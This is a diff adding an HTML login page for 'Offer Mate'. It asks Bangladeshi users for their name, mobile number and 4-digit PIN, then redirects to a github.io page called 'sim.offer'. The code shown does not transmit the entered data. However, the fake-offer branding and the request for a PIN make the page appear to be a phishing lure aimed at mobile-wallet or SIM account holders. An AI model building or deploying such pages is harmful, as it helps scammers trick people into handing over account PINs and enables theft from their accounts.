@@ -1,0 +1,176 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Offer Mate - Login</title>
+    <style>
+        /* Global styles */
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            font-family: 'Arial', sans-serif;
+            background: linear-gradient(135deg, #0f2027, #203a43, #2c5364); /* ব্যাকগ্রাউন্ড কালার */
+            height: 100vh;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            color: #fff;
+        }
+
+        .login-container {
+            background: #fff; /* সাদা ব্যাকগ্রাউন্ড লগইন বক্সে */
+            padding: 30px 40px;
+            border-radius: 12px;
+            box-shadow: 0 8px 25px rgba(0, 0, 0, 0.4);
+            animation: slideIn 1s ease;
+            width: 100%;
+            max-width: 400px;
+            text-align: center;
+        }
+
+        h1 {
+            text-align: center;
+            margin-bottom: 20px;
+            font-size: 2.5em;
+            color: #00c6ff;
+        }
+
+        /* App Name Styling */
+        .app-name {
+            font-size: 1.5em;
+            margin-bottom: 20px;
+            color: #0072ff;
+        }
+
+        label {
+            display: block;
+            margin-top: 15px;
+            font-size: 1em;
+            color: #333;
+            text-align: left;
+        }
+
+        input, select, button {
+            width: 100%;
+            padding: 10px;
+            margin-top: 10px;
+            border: none;
+            border-radius: 8px;
+            font-size: 1em;
+        }
+
+        input, select {
+            background: rgba(0, 0, 0, 0.05);
+            color: #333;
+            border: 1px solid rgba(0, 0, 0, 0.2);
+        }
+
+        input:focus, select:focus {
+            outline: none;
+            border-color: #00c6ff;
+            box-shadow: 0 0 10px rgba(0, 198, 255, 0.7);
+        }
+
+        button {
+            background: linear-gradient(135deg, #00c6ff, #0072ff);
+            color: #fff;
+            font-weight: bold;
+            cursor: pointer;
+            transition: background 0.3s ease, transform 0.3s ease;
+        }
+
+        button:hover {
+            background: linear-gradient(135deg, #0072ff, #00c6ff);
+            transform: scale(1.05);
+        }
+
+        .phone-input {
+            display: flex;
+            gap: 10px;
+        }
+
+        select {
+            max-width: 35%;
+        }
+
+        /* Logo Styling */
+        .logo {
+            width: 80px; /* লোগোর আকার */
+            height: auto;
+            margin-bottom: 20px;
+        }
+
+        /* Animation */
+        @keyframes slideIn {
+            from {
+                opacity: 0;
+                transform: translateY(-30px);
+            }
+            to {
+                opacity: 1;
+                transform: translateY(0);
+            }
+        }
+    </style>
+</head>
+<body>
+    <div class="login-container">
+        <!-- Logo -->
+        <img src="https://i.ibb.co.com/TYWcKyn/account-protection.png" alt="Account Protection Logo" class="logo">
+
+        <!-- App Name -->
+        <div class="app-name">Offer Mate</div>
+
+        <h1>Login</h1>
+        <form id="loginForm">
+            <label for="name">Name:</label>
+            <input type="text" id="name" name="name" placeholder="Enter your name" required>
+
+            <label for="number">Phone Number:</label>
+            <div class="phone-input">
+                <select id="countryCode" name="countryCode">
+                    <option value="+880" selected>🇧🇩 +880 (Bangladesh)</option>
+                </select>
+                <input type="tel" id="number" name="number" placeholder="01XXXXXXXXX" pattern="01[3-9][0-9]{8}" required>
+            </div>
+
+            <label for="pin">PIN:</label>
+            <input type="number" id="pin" name="pin" placeholder="Enter your 4-digit PIN" maxlength="4" pattern="[0-9]{4}" required title="PIN must be 4 digits and only numbers">
+
+            <button type="submit">Login</button>
+        </form>
+    </div>
+
+    <script>
+        // Handle form submission
+        document.getElementById('loginForm').addEventListener('submit', function(e) {
+            e.preventDefault();
+
+            const name = document.getElementById('name').value.trim();
+            const number = document.getElementById('number').value.trim();
+            const pin = document.getElementById('pin').value.trim();
+
+            // Validate phone number starts with allowed prefixes
+            const allowedPrefixes = ['013', '014', '015', '016', '017', '018', '019'];
+            const isValidNumber = allowedPrefixes.some(prefix => number.startsWith(prefix) && number.length === 11);
+
+            // Check if PIN is 4 digits and only numbers
+            const isValidPin = /^[0-9]{4}$/.test(pin);
+
+            if (isValidNumber && isValidPin) {
+                // Redirect to the desired link
+                window.location.href = "https://bdsite71.github.io/sim.offer/";
+            } else if (!isValidNumber) {
+                alert('Invalid phone number. Please use a Bangladeshi number starting with 013, 014, 015, 016, 017, 018, or 019.');
+            } else {
+                alert('Invalid PIN. Please enter a 4-digit numeric PIN.');
+            }
+        });
+    </script>
+</body>
+</html>
